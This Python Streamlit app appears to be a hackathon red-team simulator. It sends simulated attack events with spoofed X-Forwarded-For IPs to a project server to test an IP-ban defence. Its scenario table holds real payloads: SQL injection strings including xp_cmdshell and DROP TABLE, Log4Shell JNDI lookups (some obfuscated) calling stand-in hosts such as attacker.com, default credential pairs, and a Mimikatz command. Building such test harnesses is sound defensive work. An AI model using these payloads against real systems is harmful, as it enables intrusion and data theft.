import streamlit as st
import pandas as pd
import time
import random
import requests
from datetime import datetime

# --- YAPILANDIRMA ---
RENDER_SERVER_URL = "https://okaf-hackhathon-1.onrender.com"

# Genişletilmiş Saldırı Senaryoları
ATTACK_SCENARIOS = {
    "SQL Injection": {
        "level": "Critical",
        "payloads": [
            "' OR 1=1 --",
            "UNION SELECT username, password FROM users",
            "'; DROP TABLE logs; --",
            "' OR 'x'='x",
            "1; EXEC xp_cmdshell('whoami')--",
            "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--"
        ],
        "target_service": "Customer Database",
        "mitre_id": "T1190",
        "cve_score": 9.8,
        "description": "Veritabanı sorgu enjeksiyonu ile yetkisiz veri erişimi"
    },
    "Brute Force": {
        "level": "High",
        "payloads": [
            "Admin/123456",
            "Root/toor",
            "User/password123",
            "admin/admin",
            "root/root",
            "guest/guest123",
            "operator/12345678"
        ],
        "target_service": "SSH / Web Login",
        "mitre_id": "T1110",
        "cve_score": 7.5,
        "description": "Kimlik bilgisi tahmin saldırısı ile sisteme zorla giriş"
    },
    "Man-in-the-Middle": {
        "level": "High",
        "payloads": [
            "ARP Spoofing initiated",
            "DNS Cache Poisoning active",
            "SSL Stripping — HTTPS → HTTP",
            "BGP Hijacking packet injected",
            "ICMP Redirect forged"
        ],
        "target_service": "Gateway / LAN",
        "mitre_id": "T1557",
        "cve_score": 8.1,
        "description": "Ağ ortasına geçerek iletişimi dinleme ve manipüle etme"
    },
    "DDoS Flood": {
        "level": "Critical",
        "payloads": [
            "SYN Flood — 100k pkt/s",
            "UDP Amplification x200",
            "HTTP Slowloris attack",
            "ICMP Smurf broadcast",
            "DNS Reflection amplified",
            "NTP Monlist amplification"
        ],
        "target_service": "Web Server / API",
        "mitre_id": "T1498",
        "cve_score": 9.1,
        "description": "Servis reddi — sistemi isteklerle boğarak erişimi engelleme"
    },
    "ModBus TCP Manipulation": {
        "level": "Critical",
        "payloads": [
            "Write Coil FC=05 → addr=0x0001 val=0xFF00",
            "Write Register FC=06 → addr=0x0010 val=9999",
            "Force Multiple Coils FC=0F",
            "Preset Multiple Regs FC=10 — traffic override",
            "Read Device ID FC=2B — reconnaissance"
        ],
        "target_service": "PLC / Traffic Controller",
        "mitre_id": "T1557.002",
        "cve_score": 9.8,
        "description": "Endüstriyel kontrol sistemine yetkisiz yazma — trafik ışıklarını manipüle etme"
    },
    "Log4Shell (Log4j RCE)": {
        "level": "Critical",
        "payloads": [
            "${jndi:ldap://attacker.com/exploit}",
            "${${lower:j}ndi:${lower:l}${lower:d}ap://evil.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/j}",
            "${jndi:rmi://10.0.0.1:1099/Exploit}"
        ],
        "target_service": "Java Application / JNDI",
        "mitre_id": "T1190",
        "cve_score": 10.0,
        "description": "CVE-2021-44228 — Log4j RCE ile uzaktan kod çalıştırma"
    },
    "Ransomware C2": {
        "level": "Critical",
        "payloads": [
            "C2 beacon — heartbeat sent",
            "AES-256 key exchange initiated",
            "File enumeration started: /var/data",
            "Encryption task queued: *.conf *.db *.log",
            "Exfil staging: /tmp/.hidden_upload"
        ],
        "target_service": "File System / C2 Server",
        "mitre_id": "T1486",
        "cve_score": 9.9,
        "description": "Fidye yazılımı komuta-kontrol iletişimi ve şifreleme hazırlığı"
    },
    "Credential Harvesting": {
        "level": "Medium",
        "payloads": [
            "Phishing page served: login-portal.fake.com",
            "Keylogger hook installed",
            "LSASS dump attempted",
            "Mimikatz sekurlsa::logonpasswords",
            "Browser credential DB extracted"
        ],
        "target_service": "User Endpoints / AD",
        "mitre_id": "T1056",
        "cve_score": 6.8,
        "description": "Kullanıcı kimlik bilgilerini ele geçirme"
    }
}

# Sahte IP havuzu (farklı ülkeler ve AS blokları)
IP_POOLS = {
    "Rastgele LAN": lambda: f"192.168.{random.randint(1,254)}.{random.randint(2,254)}",
    "Tor Exit Nodes (simülasyon)": lambda: f"185.{random.randint(100,200)}.{random.randint(0,255)}.{random.randint(1,254)}",
    "Botnet (simülasyon)": lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    "APT (Sabit IP Bloğu)": lambda: f"10.{random.randint(0,50)}.{random.randint(0,255)}.{random.randint(1,254)}",
    "Cloud VPS": lambda: f"45.{random.randint(60,100)}.{random.randint(0,255)}.{random.randint(1,254)}",
    "IPv6 (spoofed)": lambda: ":".join([f"{random.randint(0,65535):04x}" for _ in range(8)])
}


def generate_source_ip(pool_name: str) -> str:
    """Seçilen IP havuzundan sahte IP üret."""
    generator = IP_POOLS.get(pool_name)
    if generator:
        return generator()
    return f"192.168.1.{random.randint(10, 254)}"


def send_attack_to_server(source_ip: str, attack_type: str, cve_score: float):
    """Saldırı paketini sunucuya gönder. 403 dönerse ban kaydeder."""
    try:
        payload = {
            "active": True,
            "source_ip": source_ip,
            "attack_type": attack_type,
            "cve_score": cve_score
        }
        response = requests.post(
            f"{RENDER_SERVER_URL}/api/attack",
            json=payload,
            timeout=3,
            headers={
                "X-Forwarded-For": source_ip,  # IP spoofing simülasyonu
                "X-Real-IP": source_ip,
                "User-Agent": f"RedTeam/2.0 ({attack_type})"
            }
        )

        if response.status_code == 403:
            st.session_state.banned_ips.add(source_ip)
            return False, "BANNED"

        return response.status_code == 200, str(response.status_code)

    except requests.exceptions.Timeout:
        return False, "TIMEOUT"
    except requests.exceptions.ConnectionError:
        return False, "CONN_ERROR"
    except Exception as e:
        return False, str(e)


def stop_attack():
    """Saldırıyı durdur."""
    try:
        requests.post(f"{RENDER_SERVER_URL}/api/attack", json={"active": False}, timeout=1)
    except Exception:
        pass


def main():
    st.set_page_config(
        page_title="OKAF Red Team Panel",
        layout="wide",
        page_icon="⚡"
    )

    # Koyu tema
    st.markdown("""
    <style>
        .stApp { background-color: #0b0d10; color: #00ff41; }
        .stSelectbox label, .stSlider label, .stToggle label, .stRadio label { color: #00cc33 !important; }
        .stDataFrame { background: #0d1117; }
        div[data-testid="metric-container"] { background: #0d1117; border: 1px solid #1a3050; border-radius: 8px; padding: 8px; }
        .stAlert { border-radius: 8px; }
    </style>
    """, unsafe_allow_html=True)

    st.title("⚡ OKAF Red Team — Multi-Vector Attack Simulator")
    st.caption(f"🎯 Hedef: `{RENDER_SERVER_URL}` | Eğitim Amaçlı Hackathon Simülatörü")

    # Session state başlatma
    for key, val in [
        ("attack_history", []),
        ("banned_ips", set()),
        ("total_sent", 0),
        ("total_blocked", 0),
        ("total_success", 0)
    ]:
        if key not in st.session_state:
            st.session_state[key] = val

    # ============================
    # SIDEBAR
    # ============================
    with st.sidebar:
        st.header("⚙️ Saldırı Kontrol Merkezi")

        selected_attack = st.selectbox(
            "🔫 Saldırı Senaryosu",
            list(ATTACK_SCENARIOS.keys())
        )

        ip_pool = st.selectbox(
            "🌐 Kaynak IP Havuzu (Spoofing)",
            list(IP_POOLS.keys()),
            help="Saldırı paketlerinin kaynak IP'sinin hangi havuzdan seçileceğini belirler"
        )

        multi_ip = st.toggle(
            "🔀 Dağıtık Saldırı (Her pakette farklı IP)",
            value=True,
            help="Her saldırı paketinde farklı bir kaynak IP kullanır — banlama sistemini zorlamak için"
        )

        if not multi_ip:
            fixed_ip = st.text_input(
                "📌 Sabit Kaynak IP",
                value=generate_source_ip(ip_pool),
                help="Dağıtık mod kapalıyken bu IP kullanılır"
            )
        else:
            fixed_ip = None

        intensity = st.slider("⏱️ Saldırı Aralığı (saniye)", 0.3, 5.0, 1.5, step=0.1)

        burst_mode = st.toggle(
            "💥 Burst Mode (5 paket/tetik)",
            value=False,
            help="Her tetiklemede 5 paket arka arkaya gönderir"
        )

        is_active = st.toggle("🔴 SALDIRIYI BAŞLAT", value=False)

        if not is_active:
            stop_attack()

        st.divider()
        st.subheader("📋 Seçili Senaryo")
        scenario = ATTACK_SCENARIOS[selected_attack]
        st.json({
            "level":      scenario["level"],
            "mitre_id":   scenario["mitre_id"],
            "cve_score":  scenario["cve_score"],
            "target":     scenario["target_service"]
        })

        st.divider()
        if st.button("🗑️ Geçmişi Temizle"):
            st.session_state.attack_history = []
            st.session_state.total_sent    = 0
            st.session_state.total_blocked = 0
            st.session_state.total_success = 0
            st.session_state.banned_ips    = set()
            st.rerun()

    # ============================
    # ANA İÇERİK
    # ============================
    col_status, col_metrics = st.columns([1, 2])

    with col_status:
        if is_active:
            st.error(f"🔥 AKTİF SALDIRI: **{selected_attack}**")
            st.warning(f"CVE Skoru: **{scenario['cve_score']}** | {scenario['level']}")
            st.info(f"📋 {scenario['description']}")
        else:
            st.success("✅ Sistem Beklemede (Standby)")
            st.caption("Saldırıyı başlatmak için sol paneldeki toggle'ı açın.")

        # Banlı IP listesi
        if st.session_state.banned_ips:
            st.error(f"🚫 Sunucu tarafından banlanan IP'ler: **{len(st.session_state.banned_ips)}**")
            with st.expander("Banlı IP'leri Göster"):
                for bip in list(st.session_state.banned_ips)[:20]:
                    st.code(bip)

    with col_metrics:
        m1, m2, m3, m4 = st.columns(4)
        m1.metric("📤 Gönderilen", st.session_state.total_sent)
        m2.metric("✅ Başarılı",   st.session_state.total_success)
        m3.metric("🚫 Engellenen", st.session_state.total_blocked)
        m4.metric("🌐 Banlı IP",   len(st.session_state.banned_ips))

    st.divider()

    # ============================
    # SALDIRI DÖNGÜSÜ
    # ============================
    if is_active:
        packets_to_send = 5 if burst_mode else 1

        for _ in range(packets_to_send):
            source_ip = generate_source_ip(ip_pool) if (multi_ip or not fixed_ip) else fixed_ip
            payload   = random.choice(scenario["payloads"])
            cve_score = scenario["cve_score"]

            # Banlı IP'yi atla (dağıtık modda)
            if source_ip in st.session_state.banned_ips and multi_ip:
                source_ip = generate_source_ip(ip_pool)

            success, status_code = send_attack_to_server(source_ip, selected_attack, cve_score)

            st.session_state.total_sent += 1
            if status_code == "BANNED":
                st.session_state.total_blocked += 1
            elif success:
                st.session_state.total_success += 1
            else:
                st.session_state.total_blocked += 1

            event = {
                "timestamp":   datetime.now().strftime("%H:%M:%S.%f")[:-3],
                "source_ip":   source_ip,
                "attack_type": selected_attack,
                "payload":     payload[:60] + ("…" if len(payload) > 60 else ""),
                "cve_score":   cve_score,
                "mitre_id":    scenario["mitre_id"],
                "ip_pool":     ip_pool,
                "status":      "✅ SENT" if success else ("🚫 BANNED" if status_code == "BANNED" else f"❌ {status_code}")
            }
            st.session_state.attack_history.insert(0, event)

        if len(st.session_state.attack_history) > 200:
            st.session_state.attack_history = st.session_state.attack_history[:200]

    # ============================
    # LOG TABLOSU
    # ============================
    st.subheader("📡 Outbound Attack Log (Giden Saldırı Trafiği)")

    if st.session_state.attack_history:
        df = pd.DataFrame(st.session_state.attack_history)
        st.dataframe(
            df,
            use_container_width=True,
            height=min(500, 35 + len(df) * 35),
            column_config={
                "cve_score": st.column_config.NumberColumn("CVE Score", format="%.1f"),
                "status":    st.column_config.TextColumn("Durum", width="small"),
                "source_ip": st.column_config.TextColumn("Kaynak IP", width="medium"),
            }
        )

        # CSV indir
        csv = df.to_csv(index=False).encode("utf-8")
        st.download_button(
            label="📥 Log'u CSV Olarak İndir",
            data=csv,
            file_name=f"okaf_attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )
    else:
        st.info("Henüz saldırı paketi gönderilmedi. Saldırıyı başlatın.")

    # Otomatik yenileme
    if is_active:
        time.sleep(intensity)
        st.rerun()


if __name__ == "__main__":
    main()
